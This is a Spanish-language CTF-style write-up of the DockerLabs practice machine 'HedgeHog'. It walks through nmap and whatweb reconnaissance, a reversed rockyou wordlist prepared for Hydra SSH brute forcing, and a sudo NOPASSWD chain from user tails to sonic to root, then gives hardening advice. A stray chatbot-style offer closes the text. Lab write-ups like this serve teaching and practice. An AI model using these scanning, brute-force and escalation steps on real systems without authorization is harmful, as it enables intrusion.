# 🖥️ Máquina: **HedgeHog**  
🔹 **Dificultad:** Muy Fácil

---

## 📌 Descripción

**HedgeHog** es una máquina de práctica alojada en **DockerLabs**, diseñada para introducir a los usuarios en el análisis de servicios, reconocimiento de puertos y escalada de privilegios. En esta máquina se aplican técnicas de descubrimiento con Nmap, análisis de páginas web, uso de diccionarios personalizados y revisión de permisos de `sudo` para escalar privilegios.

![Logo](/HedgeHog/Imagenes/Logo.png)

---

## 🚀 Inicio

Primero descargamos e iniciamos la máquina vulnerable con el siguiente comando:

```bash
sudo bash auto_deploy.sh hedgehog.tar
```

![Inicio de máquina](/HedgeHog/Imagenes/Iniciar.jpeg)

---

## 📡 Verificando conectividad

Realizamos un ping para comprobar que la máquina está activa:

```bash
ping 172.17.0.2
```

El valor **TTL** puede darnos pistas sobre si se trata de un sistema Linux o Windows, aunque este dato puede ser modificado.

![Ping](/HedgeHog/Imagenes/Ping.jpeg)

---

## 🔍 Reconocimiento de puertos

Ejecutamos un escaneo completo de puertos usando Nmap:

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts.txt
```

Esto reveló que están abiertos los puertos **22 (SSH)** y **80 (HTTP)**.

![Puertos](/HedgeHog/Imagenes/Puerto.jpeg)

---

Tengo un script propio que me permite extraer la IP y los puertos del archivo `allPorts.txt`:

```bash
extractPorts allPorts.txt
```

> ℹ️ Más detalles sobre este script están disponibles en mis repositorios.

Luego hacemos un escaneo más detallado sobre los puertos encontrados:

```bash
nmap -sC -sV -p 22,80 172.17.0.2 -oN target.txt
```

Este análisis nos permite identificar versiones de servicios, útiles para buscar vulnerabilidades.

![Servicios detectados](/HedgeHog/Imagenes/Servicios.jpeg)

---

## 🌐 Análisis web

Ingresamos al sitio web disponible en el puerto 80. Allí encontramos un posible nombre de usuario para SSH. Para confirmar la tecnología detrás del sitio, ejecutamos:

```bash
whatweb 172.17.0.2
```

Probamos también con **Gobuster** y **Wfuzz** para buscar directorios o subdominios ocultos, pero no obtuvimos resultados.

![Sitio web](/HedgeHog/Imagenes/Pagina.jpeg)

---

## 🗝️ Preparación de diccionario personalizado

Intentamos un ataque con **Hydra**, pero el proceso fue muy lento. Por eso, decidimos probar contraseñas desde el final del archivo `rockyou.txt`, ya que es posible que las credenciales estén al final.

Para ello, invertimos el diccionario:

```bash
tac /usr/share/wordlists/rockyou.txt >> /usr/share/wordlists/rockyou_invertido.txt
```

Verificamos su contenido:

```bash
cat /usr/share/wordlists/rockyou_invertido.txt | head
```

Notamos espacios innecesarios, así que los eliminamos con:

```bash
sed -i 's/  //g' /usr/share/wordlists/rockyou_invertido.txt
```

Y comprobamos nuevamente el archivo para asegurarnos de que esté limpio.

> 🔍 Nota: la ruta del diccionario depende de tu sistema y dónde tengas instalada tu biblioteca de listas de palabras.

![Hydra](/HedgeHog/Imagenes/Hydra.jpeg)

---

## 🔐 Acceso por SSH

Una vez obtenidas las credenciales válidas, accedimos al servicio **SSH**.

---

## 🔼 Escalada de privilegios desde el usuario `tails`

### 1️⃣ Verificar permisos de sudo

Al ejecutar `sudo -l`, obtuvimos:

```bash
User tails may run the following commands on 04d3ae7efbc6:
    (sonic) NOPASSWD: ALL
```

Esto indica que el usuario `tails` puede ejecutar cualquier comando como el usuario `sonic` sin necesidad de contraseña.

---

### 2️⃣ Intentar acceder al directorio de `sonic`

```bash
cd /home/sonic/
```

Resultado:

```bash
-bash: cd: /home/sonic/: Permission denied
```

Esto ocurre porque `tails` no tiene permisos directos sobre ese directorio.

---

### 3️⃣ Cambiar al usuario `sonic`

```bash
sudo -u sonic /bin/bash
```

Este comando nos dio acceso a una shell como el usuario `sonic`, gracias a los permisos `NOPASSWD`.

---

### 4️⃣ Escalar a `root` desde `sonic`

Desde la sesión como `sonic`, ejecutamos:

```bash
sudo -u root /bin/bash
```

Y confirmamos acceso como superusuario:

```bash
whoami
# root
```

![Escalada de privilegios](/HedgeHog/Imagenes/Privilegio.jpeg)

---

## ✅ Resultado: Acceso root exitoso

Logramos obtener una shell como `root` mediante una cadena de escalada:

1. `tails` → `sonic` (por sudo sin contraseña)  
2. `sonic` → `root` (también con sudo sin restricciones)

---

## 🧠 ¿Por qué funcionó?

Aunque `tails` no puede ejecutar directamente comandos como `root`, sí puede hacerlo como `sonic`. Y como `sonic` tiene permisos ilimitados en sudo, esto nos permitió escalar sin restricciones.

---

## 🔒 Recomendación de seguridad

Para prevenir este tipo de escalada de privilegios:

- No otorgues permisos `NOPASSWD: ALL` sin necesidad clara  
- Limita los comandos específicos que se pueden ejecutar vía sudo  
- Audita el archivo `/etc/sudoers` regularmente

---

¿Deseas que este informe se convierta también en una plantilla reutilizable o formato para tus futuros reportes?
